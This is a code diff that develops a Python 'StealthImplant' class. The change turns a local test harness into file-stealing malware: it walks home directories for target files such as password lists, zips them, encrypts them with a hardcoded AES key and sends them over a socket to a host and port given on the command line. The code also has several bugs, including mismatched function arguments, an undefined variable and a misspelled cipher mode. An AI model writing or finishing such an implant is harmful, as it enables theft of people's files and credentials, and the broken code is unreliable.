@@ -12,6 +12,8 @@ class StealthImplant:
     # we look for file matching "target"
     def __init__(
         self, 
+        server_ip,
+        server_port,
         source="/home/",
         # This can be either directory or file
         target_files=[
@@ -24,6 +26,9 @@ class StealthImplant:
         test=False
     ):
 
+        self.server_ip = server_ip
+        self.server_port = server_port
+
         self.root_dir=Path(source).expanduser()
         self.target_files=target_files
         self.history_glob=history_glob
@@ -31,22 +36,25 @@ class StealthImplant:
         self.ignore_dirs = {"lost+found", "cache", "tmp" }
         self.encryption_key = b'16bytessecretkey'  # AES-128
         self.encryption_iv = b'16bytepubliciv!'
-
+        
         self._log("Implant initialize")
         self._log(f"source: {source}")
         self._log(f"target files: {target_files}")
     
-    def run(self):
+    def run(self, server_ip, server_port):
         try:
             self._log("Running...")
             collected_files=self.walk_dir()
             self._log(f"successfully retrieve {len(collected_files)} files")
-            zip_bytes = self.create_zip(collected_files)
-            with open("output.zip", "wb") as f:
-                f.write(zip_bytes)
+            zip_data = self.create_zip(collected_files)
+            self._log(f"Successfully encrypted data")
+            encrypted = self.encrypt(zip_data)
+
+            self.send_to_server(encrypted, self.server_ip, self.server_port)
+            return True
         except Exception as e:
-            if self.test:
-                raise
+            self._log(f"Error: e")
+            return False
 
     # get list of file from source
     # matching target
@@ -92,18 +100,25 @@ class StealthImplant:
         return zip_buffer.getvalue()
 
     # encrypt the data
-    def encrypt(self):
-        pass
-
+    def encrypt(self, data):
+        cipher = AES.new(self.encryption_key, AES.MOD_CBC, self.encryption_iv)
+        return cipher.encrypt(pad(data, AES.block_size))
+    
     # send to server
-    def send_to_server(self):
-        pass
+    def send_to_server(self, ip, port):
+        with socket.socket() as sock:
+            sock.connect((ip, port))
+            socket.sendall(data)
 
     def _log(self, message:str):
         if self.test: print(message)
 
 def main():
-    implant = StealthImplant(source="test_data", target_files=["passwords.txt", "users_data.txt"], test=True)
+    if len(sys.argv) != 3:
+        print("Usage: ./tmp363 <host> <port>")
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    implant = StealthImplant(host, port)
     implant.run()
 
 if __name__ == "__main__":
